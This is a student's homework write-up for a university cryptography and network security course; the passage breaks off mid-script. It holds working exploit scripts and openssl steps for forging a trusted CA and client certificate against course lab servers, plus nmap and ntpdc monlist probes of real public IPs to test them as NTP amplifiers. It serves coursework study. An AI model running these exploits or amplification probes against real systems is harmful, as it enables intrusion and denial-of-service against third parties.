0xd73e2ef8f2e4f1de44ee80070beef39943d4fa89a7a7ab4b0061e851aca7deb4f717f2baf4a0c018f3dcdab92148596bc50800fd6eb2f2e7757e0343534aea2241f0a2d34795a08f8e5ccc7959184b9cf8e3007a8ad63acd7d4b350dbf2d4caf04f4bc98d74a3b01d3b1aced745133186fd8460a2dff536a74ee4d041c988d5743cc9355144f48fe5f52db0449a46ba7c15c04001a5cb141796b5b42d9d72c36cca6d6bb8f177aee1699a47ba5d87c7ee886467af18403dbd84e102a952ebee03cc70bcf072c26b1b1f0f5094be08470c6c1769b417feffd5c89a0c373f75a350d177309618bfeb16316c660c6b2a341a984c8845081ede7c42e22cc9272aa15 \u0026gt;\u0026gt;\u0026gt; q = 0xd73e2ef8f2e4f1de44ee80070beef39943d4fa89a7a7ab4b0061e851aca7deb4f717f2baf4a0c018f3dcdab92148596bc50800fd6eb2f2e7757e0343534aea2241f0a2d34795a08f8e5ccc7959184b9cf8e3007a8ad63acd7d4b350dbf2d4caf04f4bc98d74a3b01d3b1aced745133186fd8460a2dff536a74ee4d041c988d5743cc9355144f48fe5f52db0449a46ba7c15c04001a5cb141796b5b42d9d72c36cca6d6bb8f177aee1699a47ba5d87c7ee886467af18403dbd84e102a952ebee03cc70bcf072c26b1b1f0f5094be08470c6c1769b417feffd5c89a0c373f75a350d177309618bfeb16316c660c6b2a341a984c8845081eded2ff580f9f582ac79 \u0026gt;\u0026gt;\u0026gt; key_params = (n, e, d, p, q) \u0026gt;\u0026gt;\u0026gt; key = RSA.construct(key_params) \u0026gt;\u0026gt;\u0026gt; f = open(\u0026#39;./rsaprivatekey.pem\u0026#39;, \u0026#39;w\u0026#39;) \u0026gt;\u0026gt;\u0026gt; f.write(key.exportKey().decode()) \u0026gt;\u0026gt;\u0026gt; f.close() Decrypt SSL Package - Refer to this page Setting in /Edit/Preferences/TSL/RSA keys list as below and click OK: Then we can observe that some packages can decrypt TLS message: Set the wireshark\u0026rsquo;s filter to data :::spoiler Screenshot :::\n:::success Then we can browse each packages that be decrypted and we can fetch the username and password Username: Alice413 Password: dogsarecute Command: Flag...plzzzzz... :::\nCannot connect to server directly\u0026hellip; :::spoiler Connecting Message\n$ openssl s_client -connect cns.csie.org:12345 CONNECTED(00000003) depth=1 C = TW, ST = Taiwan, L = Taipei, O = NTU CNS, OU = ROOT, CN = ROOT, emailAddress = cns@csie.ntu.edu.tw verify error:num=19:self signed certificate in certificate chain verify return:1 depth=1 C = TW, ST = Taiwan, L = Taipei, O = NTU CNS, OU = ROOT, CN = ROOT, emailAddress = cns@csie.ntu.edu.tw verify return:1 depth=0 C = TW, ST = Taiwan, L = Taipei, O = NTU CNS, OU = TA, CN = CNS, emailAddress = cns@csie.ntu.edu.tw verify return:1 --- Certificate chain 0 s:C = TW, ST = Taiwan, L = Taipei, O = NTU CNS, OU = TA, CN = CNS, emailAddress = cns@csie.ntu.edu.tw i:C = TW, ST = Taiwan, L = Taipei, O = NTU CNS, OU = ROOT, CN = ROOT, emailAddress = cns@csie.ntu.edu.tw 1 s:C = TW, ST = Taiwan, L = Taipei, O = NTU CNS, OU = ROOT, CN = ROOT, emailAddress = cns@csie.ntu.edu.tw i:C = TW, ST = Taiwan, L = Taipei, O = NTU CNS, OU = ROOT, CN = ROOT, emailAddress = cns@csie.ntu.edu.tw --- Server certificate -----BEGIN CERTIFICATE----- MIIFgTCCA2kCCQCQOH8t8/tG3TANBgkqhkiG9w0BAQsFADCBgzELMAkGA1UEBhMC VFcxDzANBgNVBAgMBlRhaXdhbjEPMA0GA1UEBwwGVGFpcGVpMRAwDgYDVQQKDAdO VFUgQ05TMQ0wCwYDVQQLDARST09UMQ0wCwYDVQQDDARST09UMSIwIAYJKoZIhvcN AQkBFhNjbnNAY3NpZS5udHUuZWR1LnR3MB4XDTIzMDQwNzE0MzYxOFoXDTIzMDYw NjE0MzYxOFowgYAxCzAJBgNVBAYTAlRXMQ8wDQYDVQQIDAZUYWl3YW4xDzANBgNV BAcMBlRhaXBlaTEQMA4GA1UECgwHTlRVIENOUzELMAkGA1UECwwCVEExDDAKBgNV BAMMA0NOUzEiMCAGCSqGSIb3DQEJARYTY25zQGNzaWUubnR1LmVkdS50dzCCAiIw DQYJKoZIhvcNAQEBBQADggIPADCCAgoCggIBALT5ggDxMJ6KSGgkBRBRrIB5D45m 2sR0TizlE0+0MhIfQcVHHjRZ0B5W5kvv0gNMZeswDr8ARTQiIb/yBrbN2n8zScF7 CFY6V2cx+Vpk4vAK9wtcuy9POI1JzoLadspgmm7BUp8psPoL7cV2S4ZHLixaxRmM 7bb14ejgypUOoRvEz15aBJfbOtlvWnRc+QLVa+OUolkGj+GYvJ3o/o0DSnEBP0bC rHJFEhHrEScobBlGfq86EASZQtRrD0nzxRwBwGovjJRBbMGq2usZHelZ8CQc6PMl dchIvS9Pj4TatG4qp61F3hxgYPu+6WaPjpy202a4zWzpn3i77xRfK3t+UiL3Ysy5 XxexU4JgwupFVxBhsNhz++YNYd2HqkgzrHG4AvK5HTDzjjCunaOfvRxT6ASW9RFS EoWzux2j3HmTFGPSeNH+KKd4gKnyNoApxM7//ru9aQT4UpGzYG0LXtPv2MHuFFON wFEnRmX0sPVdbG4S0styisFfemVytxpb1voBvdsK8hEJG/9MjsfpPvrkZUsquuCe Nb4pr7/D9N+OQ0jFJbnYZioaw0Ta2xW5U5BfY5tI/sfPz98nzArYK5NtXv58DYkb +XUtP7CFfTgzffAz5LaB0Z7IYDU1UE0FpCEDbAd2lEgu7pGaRLMpbipMJyy/e78U ttYusZTk7oO6In/tAgMBAAEwDQYJKoZIhvcNAQELBQADggIBADUURCitnBqjR2LL EziFxRWGZTP6TtsqMgqRu1UJaeyeFR+8y+ou1IWQE+4T80ygsXvFiDyF+ZtrpEML qottWHOrN5/J5MxxLi6qvRbz/TpEQEn7iTWc56CyOzNStJ2hNyAzl2z/mkHefxog OuaVfr2qnC6k2Hy+7ZFxIZCIDs9/8pXrWO+0p7HzwMTAaZS5egzPASM5MYHkfBBO EIMjQVNxPJJq3XrQEUsHbgcgDnYrtx3z40Vg7phUEtxObXBvRL7pSVUDbSRORXcI kBJjgA950mQnBbDulfnu44qquJb/767SETMRIz7qWGEXHqiWG8XONYoi04Q/wOlg lVuenzCZWDDGV34CKhvKhJ6/TbOZ1GB2s1FZh8l0szjLiODditvlfE9VcV4OWH5u h7FgUC6bn2fclmybtEDX99YH23nKgpMgHliy8YsuK7t/hUS31HklUBKPRlrqc+nK VrrpH7Z+g/KeHqxVDnu0eM1wLqqCCe+QDiTZUOg1Ixu/7TjLVSBoNrjtqexj0KWK VYvXo8YskiZv0I5J9N1YXIutXWUSorGQPAhdE/wCNJKhdYxFjJy+F9qM8f4eaIWC f4Yv+m7tAwNjuNJBpj8R6GXWk0r4j6+vtrbanKru94BbG3tcUciVPGamhbSDLMgH sIkh+nDYy4AtBA87hAgUSKP/kkkA -----END CERTIFICATE----- subject=C = TW, ST = Taiwan, L = Taipei, O = NTU CNS, OU = TA, CN = CNS, emailAddress = cns@csie.ntu.edu.tw issuer=C = TW, ST = Taiwan, L = Taipei, O = NTU CNS, OU = ROOT, CN = ROOT, emailAddress = cns@csie.ntu.edu.tw --- No client certificate CA names sent Requested Signature Algorithms: ECDSA+SHA256:ECDSA+SHA384:ECDSA+SHA512:Ed25519:Ed448:RSA-PSS+SHA256:RSA-PSS+SHA384:RSA-PSS+SHA512:RSA-PSS+SHA256:RSA-PSS+SHA384:RSA-PSS+SHA512:RSA+SHA256:RSA+SHA384:RSA+SHA512:ECDSA+SHA224:RSA+SHA224 Shared Requested Signature Algorithms: ECDSA+SHA256:ECDSA+SHA384:ECDSA+SHA512:Ed25519:Ed448:RSA-PSS+SHA256:RSA-PSS+SHA384:RSA-PSS+SHA512:RSA-PSS+SHA256:RSA-PSS+SHA384:RSA-PSS+SHA512:RSA+SHA256:RSA+SHA384:RSA+SHA512 Peer signing digest: SHA256 Peer signature type: RSA-PSS Server Temp Key: X25519, 253 bits --- SSL handshake has read 3713 bytes and written 424 bytes Verification error: self signed certificate in certificate chain --- New, TLSv1.3, Cipher is TLS_AES_256_GCM_SHA384 Server public key is 4096 bit Secure Renegotiation IS NOT supported Compression: NONE Expansion: NONE No ALPN negotiated Early data was not sent Verify return code: 19 (self signed certificate in certificate chain) --- 140631277094208:error:1409445C:SSL routines:ssl3_read_bytes:tlsv13 alert certificate required:ssl/record/rec_layer_s3.c:1563:SSL alert number 116 :::\nExploit # Try to use the info above to register a verified CA :::spoiler The following info that you should fill in can be found in wireshark. You can use string search by Taipei or NTU CNS ::: $ openssl req -new -key private.key -out new_ca.csr $ openssl req -x509 -new -nodes -key private.key -sha256 -days 36500 -out rootCA.crt $ openssl x509 -req -in new_ca.csr -CAkey private.key -CA rootCA.crt -CAcreateserial -out new_ca.crt Using ROOT as your certificate info. Create your own certificate :::spoiler ::: $ openssl genrsa -out mykey.key $ openssl req -new -key mykey.key -out my_new_ca.csr $ openssl x509 -req -in my_new_ca.csr -CAkey private.key -CA rootCA.crt -CAcreateserial -out my_new_ca.crt Using Alice413 as your certificate info. Connect To Server with .crt \u0026amp; .key $ openssl s_client -connect cns.csie.org:12345 -cert my_new_ca.crt -key mykey.key Flag: CNS{ph4Ul7y_K3y_93n3R471oN_15_D4N93rOU2!} :::spoiler Another Payload From @B10902070林鈺翔(PS: thx a lot) $ openssl req -new -key CAkey -out CA.csr -subj \u0026#34;/C=TW/ST=Taiwan/L=Taipei/O=NTU CNS/OU=ROOT/CN=ROOT/emailAddress=cns@csie.ntu.edu.tw\u0026#34; $ openssl x509 -req -sha256 -days 365 -in CA.csr -signkey CAkey -out CA.crt $ openssl req -x509 -new -nodes -key CAkey -sha256 -days 36500 -out rootCA.crt -subj \u0026#34;/C=TW/ST=Taiwan/L=Taipei/O=NTU CNS/OU=ROOT/CN=ROOT/emailAddress=cns@csie.ntu.edu.tw\u0026#34; $ openssl genrsa -out mykey $ openssl req -new -key mykey -out mykey.csr -subj \u0026#34;/C=TW/ST=Taiwan/L=Taipei/O=NTU CNS/OU=VIP/CN=Alice413/emailAddress=cns@csie.ntu.edu.tw\u0026#34; $ openssl x509 -req -CAcreateserial -days 365 -sha256 -CA rootCA.crt -CAkey CAkey -in mykey.csr -out mykey.crt $ openssl s_client -connect cns.csie.org:12345 -cert mykey.crt -key mykey :::\n5. Little Knowledge Proof # Recon # a) This problem is given two server to simulate Alice and Bob communication. How about Men-In-The-Middle attack?\nb) Given $y=g^x\\ (mod\\ p)$, $a=g^r\\ (mod\\ p)$. And the output is $w=cx+r$. Therefore, if you want to know what $x$ is, the simplest way is $x={w-r\\over c}$ and let $c=1$. Then what is $r$? My first perspective is using the exploit of LCG, that is: $$ \\left{ \\begin{array}{c} a^1=g^{S_0} (mod\\ p)\\ a^2=g^{S_1} (mod\\ p)\\ a^3=g^{S_2} (mod\\ p)\\ \\end{array} \\right. \\ \\ and\\ \\ \\left{ \\begin{array}{c} \\begin{aligned} a^1\u0026amp;=g^{S_0} (mod\\ p)\\ a^2\u0026amp;=g^{(AS_0\\ +\\ C)\\ (mod\\ p)} (mod\\ p)\\ a^3\u0026amp;=g^{(AS_1\\ +\\ C)\\ (mod\\ p)} (mod\\ p)\\ \\end{aligned} \\end{array} \\right. $$\nBut this is too complicated, there must exit an easy way~~ Our goal is we wanna know what $x$ is.\nc) Hint: find the order of the group. Can you factorize the order? The Pohlig-Hellman algorithm is very useful in practice if the order of the group in which we would like to solve a given discrete logarithm problem is smooth, that is it has only \u0026ldquo;small\u0026rdquo; prime divisors. Hence the discrete logarithm problem in a group $G$ is as hard as the discrete logarithm problem in the largest subgroup of prime order in $G$. Refer to online tool provided by @B10902070林鈺翔\nExploit # a) Assume $$ a=g^r (mod\\ p) \\ w=cx+r \\ Verified\\ Expression \\to g^w=y^c*a(mod\\ p) \\ $$\nNote left of Alice: Choose random r and compute a Alice-\u0026gt;Bob: a Note right of Bob: Choose a random challenge c∈Zp Bob-\u0026gt;Alice: c Note left of Alice: Compute w Alice-\u0026gt;Bob: w Note right of Bob: Verify that verified expression So, this problem\u0026rsquo;s exploit solution is just access two server respectively and copy the $a$ and $w$ from Alice and paste it to Bob and copy $c$ from Bob and paste it to Alice. Finally, we\u0026rsquo;ll fetch the flag 1.\nFlag 1: CNS{Man_1n_4he_M1dd1e_a44ack} b) The main idea is if we input $c=0$, then we can fetch $r_0$ from server(because $w \\leftarrow r_0$), and we can use $r_0$ to compute $r_1$ and let $c=1$ to get $x$(because $w \\leftarrow x+r_1$, $x \\leftarrow w-r_1$)\nFlag 2: CNS{r\u0026amp;omne$$$hould_B_unp#ff0000ic\\tle} :::spoiler Whole Exploit\nfrom pwn import * r = remote(\u0026#39;cns.csie.org\u0026#39;, 12346) context.arch = \u0026#39;amd64\u0026#39; a_init = 0x9b78f3e598a4eefdb785ad571a91017b85418cd79347515da91d5b95fe99886eab96937f681d52315ca3042240371ed438db3f33150439d71e7fb07f9772a2bd c_init = 0xe97d1423cba3ef9f5367193ca722b5c4e8da6d561c9cc98ba7ffbc0688f50ad3fce7ae84d21b69b0df1f24e8ddc533fc97da8441bc1f2031f293999a78520fb3 r.sendline(b\u0026#39;y\u0026#39;) r.recvline() p = int(r.recvline().decode().split(\u0026#34; \u0026#34;)[-1].strip()) g = 2 r.recvline() y = int(r.recvline().decode().split(\u0026#34; \u0026#34;)[-1].strip()) log.info(\u0026#34;P = {}\\ng = {}\\ny = {}\\n\u0026#34;.format(p, g, y)) for i in range(2): r.recvlines(2) r.recvuntil(b\u0026#34;a = \u0026#34;) a = int(r.recvline().decode().split(\u0026#34; \u0026#34;)[-1].strip()) r.sendlineafter(b\u0026#34;c = \u0026#34;, str(i).encode()) if i == 0: r0 = int(r.recvline().decode().split(\u0026#34; \u0026#34;)[-1].strip()) r1 = (a_init * r0 + c_init) % p else: w = int(r.recvline().decode().split(\u0026#34; \u0026#34;)[-1].strip()) plaintext = w - r1 plaintext = bytes.fromhex(hex(plaintext).replace(\u0026#34;0x\u0026#34;, \u0026#34;\u0026#34;)).decode(\u0026#39;utf-8\u0026#39;) log.info(\u0026#34;Flag 2 = {}\u0026#34;.format(plaintext)) r.close() ::: c)\nThe source code is as below: :::spoiler Source Code\ndef PohligHellman(g,h,p): pretty_print(html(\u0026#39;The prime $p$ is $%s$\u0026#39;%latex(p))) F=GF(p) g1=F(g) h1=F(h) N=p-1 qi=[r^N.valuation(r) for r in prime_divisors(N)] pretty_print(html(\u0026#39;Prime power divisors of $p-1: %s$\u0026#39;%latex(qi))) lqi=len(qi) Nqi=[N/q for q in qi] gi=[g1^r for r in Nqi] hi=[h1^r for r in Nqi] xi=[discrete_log(hi[i],gi[i]) for i in range(lqi)] pretty_print(html(\u0026#39;Discrete logarithms $x_i=%s$\u0026#39;%latex(xi))) x=CRT(xi,qi) pretty_print(html(r\u0026#39;We have that $\\log_g h=%s$\u0026#39;%latex(x))) return x PohligHellman(11,9561649903826401194424429829087038008994189104830088932155338858706813419184358908819778209856931077467756994935446807814714436047612742953865073558777496,14441638348624213626083118173029616034636236203323405960283519413957104355762238013154233838351528737517308038661176687865191516418733778513644060317253479) :::\n:::spoiler Sage Output\nThe prime p is 14441638348624213626083118173029616034636236203323405960283519413957104355762238013154233838351528737517308038661176687865191516418733778513644060317253479 Prime power divisors of p−1:[2,9904578032905937,288441413567621167681,3091058643093537522799545838540043339063,1080244137479689290215446159447411025741704035417740877269,756943935220796320321] Discrete logarithms xi=[1,5433650772715221,215701847164204296075,1765169489445336822335616493450319873721,522719848230573526650683484133826256116093515592372329920,371628781438728217083] We have that loggh=1995135457311837329338013220674023065119097253499626394183669323611116768755869053 1995135457311837329338013220674023065119097253499626394183669323611116768755869053 ::: Then we can transfer the result to ASCII string that is a flag. Flag: CNS{CDH_f@!l_wHEn_tHE_'_is_uns@Fe}\n6. Clandestine Operation II # Recon # Exploit # a) The detailed process is as below:\nThe client sends a negotiation request to the server, indicating that it wants to use NTLMv2 authentication. The server responds with a challenge. The challenge is a random number that is generated by the server and sent to the client. The client encrypts the challenge including Client Nonce + Server Nonce + Timestamp + Username + Target using its password and sends the result back to the server. The encryption process involves the use of a hash function(HMAC-MD5) to transform the password into a fixed-length value. The server uses its copy of the user\u0026rsquo;s password to encrypt the challenge, then compares the result with the encrypted value sent by the client. If the two values match, the user is authenticated. b) Ans:\nThe client sends a negotiation request to the server, indicating that it wants to use NTLMv2 signing with key exchange scheme. The server responds with a challenge, which includes a nonce (a random number). The client generates a session key by hashing the user\u0026rsquo;s password with the nonce. The client encrypts the session key with the server\u0026rsquo;s public key and sends it to the server. The server decrypts the session key using its private key. Both the client and the server now possess the same session key, which is used to sign messages exchanged between them. Each message is signed using a Message Authentication Code (MAC), which is generated by applying a cryptographic hash function to the message and the session key. When a message is received, the recipient verifies the MAC to ensure that the message has not been tampered with. c)\nd)\n7. So Anonymous, So Hidden # Recon # The main purpose of this problem is just forward the packet to the correct recipient. But can not let the attacker use timing analysis to compromise the mixer. So, we can create a list as a buffer and send them at the same time.\nExploit # :::spoiler Source Code\nfrom pwn import * from tqdm import trange from itertools import cycle from time import sleep from lib import Packet, PublicKeyCipher r = remote(\u0026#39;cns.csie.org\u0026#39;, 12804) context.arch = \u0026#39;amd64\u0026#39; e = 65537 server_n = {} r.recvuntil(b\u0026#34;server0 is (\u0026#34;) server_n[0] = int(r.recvline().strip().decode().split(\u0026#34;, \u0026#34;)[0]) r.recvuntil(b\u0026#34;server1 is (\u0026#34;) server_n[1] = int(r.recvline().strip().decode().split(\u0026#34;, \u0026#34;)[0]) r.recvuntil(b\u0026#34;server2 is (\u0026#34;) server_n[2] = int(r.recvline().strip().decode().split(\u0026#34;, \u0026#34;)[0]) r.recvuntil(b\u0026#34;Bob is (\u0026#34;) server_n[3] = int(r.recvline().strip().decode().split(\u0026#34;, \u0026#34;)[0]) log.info(\u0026#34;server0 n: {}\\nserver1 n: {}\\nserver2 n: {}\\n bob n: {}\u0026#34;.format(server_n[0], server_n[1], server_n[2], server_n[3])) r.recvuntil(b\u0026#34;Your public key is (\u0026#34;) my_n = int(r.recvline().strip().decode().split(\u0026#34;, \u0026#34;)[0]) r.recvuntil(b\u0026#34;Your private key is (\u0026#34;) my_d = int(r.recvline().strip().decode().split(\u0026#34;, \u0026#34;)[1].replace(\u0026#34;)\u0026#34;, \u0026#34;\u0026#34;)) log.info(\u0026#34;My n: {}\\nMy d: {}\u0026#34;.format(my_n, my_d)) r.recvuntil(b\u0026#34;Wait for 3 seconds to start ...\\n\u0026#34;) sleep(3) while True: packet_buffer = [] next_hop_buffer = [] while len(next_hop_buffer) \u0026lt; 100: message = r.recvline().strip().decode() if \u0026#39;CNS\u0026#39; in message: print(message) break packet = Packet(bytes.fromhex(str(message))) next_hop, next_packet = packet.decrypt_server((my_n, my_d)) next_hop_buffer.append(next_hop) packet_buffer.append(next_packet) for i in trange(len(next_hop_buffer)-1, -1, -1): r.sendline(\u0026#34;({}, {})\u0026#34;.format(next_hop_buffer[i], packet_buffer[i].data.hex())) ::: Flag: CNS{H3Y_Y0u_Ar3_A_m1x3R_ma573R}\nReference # 1. SYN Cookies # What is SYN flooding attack? - SYN 洪水攻擊 2. BGP # Characterizing Large-scale Routing Anomalies: A Case Study of the China Telecom Incident Why Is It Taking So Long to Secure Internet Routing? 3. Knowing What I Am, Not Knowing Who I Am # 4. TLS # How would I encode RSA private key, given that I know the decimal representation of all of its components? 使用 Wireshark 解密 SSL/TLS 流量 SSL protocol seems to be missing in Wireshark Using OpenSSL s_client commands to test SSL connectivity 使用 OpenSSL 製作萬用字元 SSL 憑證 如何使用 OpenSSL 建立開發測試用途的自簽憑證 (Self-Signed Certificate) openssl s_client -cert: Proving a client certificate was sent to the server 5. Little Knowledge Proof # 6. Clandestine Operation II # What is NTLMv2 - 冷知識 - NTLMv1 為什麼不安全? 7. So Anonymous, So Hidden # "},{"id":59,"href":"/security/course/ntu-cns/homework/cryptography-and-network-security--homework-3/","title":"Cryptography and Network Security – Homework 3","section":"Securities","content":" Cryptography and Network Security – Homework 3 # tags: NTUCNS # :::spoiler TOC [TOC] :::\n1. DDoS # 1) # Hint: You can use I/O Graphs to find the time that the flow starts to burst. Then you can find the first packet near there.\nAns: Using I/O graph in Statistic/I/O Graphs in wireshark, then you can figure out the whole trend of this network flow. :::spoiler Result Screenshot ::: Also, you can set the different scale of the graph and figure out the attack time precisely. I set the Interval=100ms and find the increasing time at 24.8s which is No.55862 packet shown as below. :::spoiler Result Screenshot ::: Thus, the attack time should be at 24.945277 and the victim is 192.168.232.95 :::spoiler Result Screenshot :::\n:::info Note: You can observe that how many packets of each address received or transmitted in Statistic/Endpoints. You can note that the address 192.168.232.95 has received tons of packets. :::spoiler Result Screenshot :::\n2) # Hint: How to find attack packets if you know the victim? Ans: The protocol that the attack exploit is UDP. Maybe this is a UDP flood attack. And the size of an attack packet should be $482$ bytes. Note: You can set the filter ip.dst==192.168.232.95 \u0026amp;\u0026amp; udp and observe the flow and packets. :::spoiler Result Screenshot ::: 3) # Ans: 4) # Background: this DDoS attack using NTP protocol to amplify the packets to achieve the attack.\nNTP 放大 DoS 攻擊利用響應遠程 monlist 請求的網絡時間協議（NTP）服務器。 monlist 函數返回與服務器交互的所有設備的列表，在某些情況下最多達 600 個列表。 攻擊者可以偽造來自目標 IP 地址的請求，並且漏洞服務器將為每個發送的請求返回非常大的響應 - by Kali Linux網絡掃描秘籍第六章拒絕服務(二) :::spoiler Background :::\nHint: You can find some useful statistics in IPv4 Statistics.\nAns: In IPv4 Statistics, we can note the several victims receive most of the packets. $\\to$ 192.168.232.80, 192.168.232.10, 192.168.232.95 :::spoiler Result Screenshot :::\n192.168.232.80: 28320 packets received 192.168.232.10: 26870 packets received 192.168.232.95: 23327 packets received 3 major amplifiers: 34.93.220.190, 128.111.19.188, 129.236.255.8 5) # Background: NTP 放大 DoS 攻擊利用響應遠程 monlist 請求的網絡時間協議（NTP）服務器。 monlist 函數返回與服務器交互的所有設備的列表，在某些情況下最多達 600 個列表。 攻擊者可以偽造來自目標 IP 地址的請求，並且漏洞服務器將為每個發送的請求返回非常大的響應 - by Kali Linux網絡掃描秘籍第六章拒絕服務(二)\nNTP放大攻擊：網路時間協定(Network Time Protocol, NTP)是一種允許主機之間透過封包交換進行系統時間同步之網路協定。但在NTP協定中，有一個monlist指令，當NTP伺服器收到monlist請求後，會回傳多筆近期與之通訊的列表，該列表最高限制為600筆。而攻擊者便可利用此機制，以偽裝之IP位址寄送monlist請求給NTP伺服器，則NTP伺服器便會將至多600筆之數據傳送給遭攻擊者偽冒的IP位址，導致遭偽冒之受害主機因一次大量的數據傳輸，造成其網路頻寬無法負荷，致使受害伺服器無法正常提供服務。此種攻擊之放大係數為556.9，為所有DDoS放大攻擊中放大倍率次高者。 - by 分散式阻斷服務攻擊(DDoS)趨勢與防護\nHint: You can use nmap or ntpdc to send a monlist query. Ans: Determine if the remote server is running NTP service I tried 9 IP(3 IP from previous question + 6 IPs provided from TAs) Note: -sU option can be used to specify UDP, then the -p option can be used to specify the port :::spoiler Command Result\n$ sudo nmap -sU 128.111.19.188 -p 123 Starting Nmap 7.80 ( https://nmap.org ) at 2023-05-28 22:01 CST Nmap scan report for cms28.physics.ucsb.edu (128.111.19.188) Host is up (0.15s latency). PORT STATE SERVICE 123/udp closed ntp Nmap done: 1 IP address (1 host up) scanned in 0.92 seconds $ sudo nmap -sU 34.93.220.190 -p 123 Starting Nmap 7.80 ( https://nmap.org ) at 2023-05-28 23:32 CST Note: Host seems down. If it is really up, but blocking our ping probes, try -Pn Nmap done: 1 IP address (0 hosts up) scanned in 3.21 seconds $ sudo nmap -sU 129.236.255.89 -p 123 Starting Nmap 7.80 ( https://nmap.org ) at 2023-05-28 23:32 CST Note: Host seems down. If it is really up, but blocking our ping probes, try -Pn Nmap done: 1 IP address (0 hosts up) scanned in 3.16 seconds $ sudo nmap -sU 142.44.162.188 -p 123 Starting Nmap 7.80 ( https://nmap.org ) at 2023-05-28 23:34 CST Nmap scan report for 188.ip-142-44-162.net (142.44.162.188) Host is up (0.19s latency). PORT STATE SERVICE 123/udp open ntp Nmap done: 1 IP address (1 host up) scanned in 1.06 seconds sudo nmap -sU 91.121.132.146 -p 123 Starting Nmap 7.80 ( https://nmap.org ) at 2023-05-28 23:35 CST Nmap scan report for ns3002114.ip-91-121-132.eu (91.121.132.146) Host is up (0.28s latency). PORT STATE SERVICE 123/udp open ntp Nmap done: 1 IP address (1 host up) scanned in 1.59 seconds $ sudo nmap -sU 82.65.72.200 -p 123 Starting Nmap 7.80 ( https://nmap.org ) at 2023-05-28 23:35 CST Nmap scan report for 82-65-72-200.subs.proxad.net (82.65.72.200) Host is up (0.26s latency). PORT STATE SERVICE 123/udp open ntp Nmap done: 1 IP address (1 host up) scanned in 1.40 seconds $ sudo nmap -sU 81.23.0.110 -p 123 Starting Nmap 7.80 ( https://nmap.org ) at 2023-05-28 23:35 CST Nmap scan report for clients-0.23.81.110.misp.ru (81.23.0.110) Host is up (0.29s latency). PORT STATE SERVICE 123/udp open|filtered ntp Nmap done: 1 IP address (1 host up) scanned in 5.57 seconds $ sudo nmap -sU 72.76.155.29 -p 123 Starting Nmap 7.80 ( https://nmap.org ) at 2023-05-28 23:36 CST Nmap scan report for static-72-76-155-29.nwrknj.fios.verizon.net (72.76.155.29) Host is up (0.21s latency). PORT STATE SERVICE 123/udp open ntp Nmap done: 1 IP address (1 host up) scanned in 1.17 seconds $ sudo nmap -sU 61.216.81.26 -p 123 Starting Nmap 7.80 ( https://nmap.org ) at 2023-05-28 23:37 CST Nmap scan report for 61-216-81-26.hinet-ip.hinet.net (61.216.81.26) Host is up (0.017s latency). PORT STATE SERVICE 123/udp open|filtered ntp Nmap done: 1 IP address (1 host up) scanned in 0.55 seconds ::: Final Result: 34.93.220.190 $\\to$ down 128.111.19.188 $\\to$ closed 129.236.255.89 $\\to$ down 142.44.162.188 $\\to$ open 91.121.132.146 $\\to$ open 82.65.72.200 $\\to$ open 81.23.0.110 $\\to$ open|filtered 72.76.155.29 $\\to$ open 61.216.81.26 $\\to$ open|filtered\nDetermine if NTP service can be used for amplification attacks :::spoiler Command Result\n$ ntpdc -n -c monlist 34.93.220.190 34.93.220.190: timed out, nothing received ***Request timed out $ ntpdc -n -c monlist 128.111.19.188 ntpdc: read: Connection refused $ ntpdc -n -c monlist 129.236.255.89 129.236.255.89: timed out, nothing received ***Request timed out $ ntpdc -n -c monlist 142.44.162.188 remote address port local address count m ver rstr avgint lstint =============================================================================== 213.251.128.249 123 142.44.162.188 1 4 4 0 373 373 54.39.23.64 123 142.44.162.188 1 4 4 0 429 429 105.187.151.14 59585 142.44.162.188 1 3 2 0 784 784 ... $ ntpdc -n -c monlist 91.121.132.146 91.121.132.146: timed out with incomplete data ***Response from server was incomplete $ ntpdc -n -c monlist 82.65.72.200 82.65.72.200: timed out with incomplete data ***Response from server was incomplete $ ntpdc -n -c monlist 81.23.0.110 81.23.0.110: timed out with incomplete data ***Response from server was incomplete $ ntpdc -n -c monlist 72.76.155.29 72.76.155.29: timed out with incomplete data ***Response from server was incomplete $ ntpdc -n -c monlist 61.216.81.26 61.216.81.26: timed out, nothing received ***Request timed out ::: In this moment the final result: 34.93.220.190 $\\to$ timed out 128.111.19.188 $\\to$ Connection refused 129.236.255.89 $\\to$ timed out 142.44.162.188 $\\to$ Success 91.121.132.146 $\\to$ incomplete 82.65.72.200 $\\to$ incomplete 81.23.0.110 $\\to$ incomplete 72.76.155.29 $\\to$ incomplete 61.216.81.26 $\\to$ timed out\nRecord the network flow and compute the amplification factor In my network situation and remote server circumstances, I received 100 packets with $482\\ bytes*100\\ packets=48200\\ bytes$ from NTP server so the amplification factor is just $48200/234 \\cong 206$ directly (234 is transmit packet size). :::spoiler Result Screenshot :::\n6) # Ans 1: Implement rate limiting to restrict the number of UDP packets from a single source IP. Use traffic filtering mechanisms like ACLs or firewalls to block malicious UDP traffic. Deploy IPS/IDS systems to automatically block or mitigate the attack. Enable flow monitoring to detect abnormal traffic patterns. Ans 2: Deploy firewalls and routers with robust security features. Use IDS/IPS systems to detect and block malicious UDP traffic. Implement traffic shaping and QoS to prioritize legitimate traffic. Consider using specialized DDoS mitigation services. Monitor network traffic for signs of UDP flood attacks. Keep network infrastructure and security measures up to date. 2. Smart Contract # (SKIP\u0026hellip;)\n3. Web Authentication # a) # Username: CNS-user Password: CNS-password\nBasic Authentication How to deploy your service? You can refer to this video and remember to set the extra command pip install flask-httpauth to install other library. :::spoiler Example Screenshot ::: :::spoiler Whole Script\nfrom flask import Flask from flask_httpauth import HTTPBasicAuth app = Flask(__name__) auth = HTTPBasicAuth() users = { \u0026#34;CNS-user\u0026#34;: \u0026#34;CNS-password\u0026#34;, } @auth.verify_password def verify_password(username, password): if username in users and password == users[username]: return username @app.route(\u0026#39;/\u0026#39;) @auth.login_required def index(): return \u0026#34;Hello, {}!\u0026#34;.format(auth.current_user()) if __name__ == \u0026#39;__main__\u0026#39;: app.run(port=8880) ::: Flag: CNS{H77P_4U7h_r0CK2}\nCookie-Based Authentication :::spoiler Description\nIn this subtask, you will implement cookie-based authentication. First, I will perform \u0026lsquo;POST /\u0026rsquo;, which contains two fields: \u0026lsquo;username\u0026rsquo; and \u0026lsquo;password\u0026rsquo;, in application/x-www-form-urlencoded format. Then I will execute \u0026lsquo;GET /\u0026rsquo;, which will contain the cookies returned in the previous POST request. ::: :::spoiler Whole Script\nfrom flask import Flask, request, redirect, render_template, make_response import hashlib app = Flask(__name__) app.secret_key = \u0026#39;your_secret_key\u0026#39; users = { \u0026#39;CNS-user\u0026#39;: { \u0026#39;password\u0026#39;: 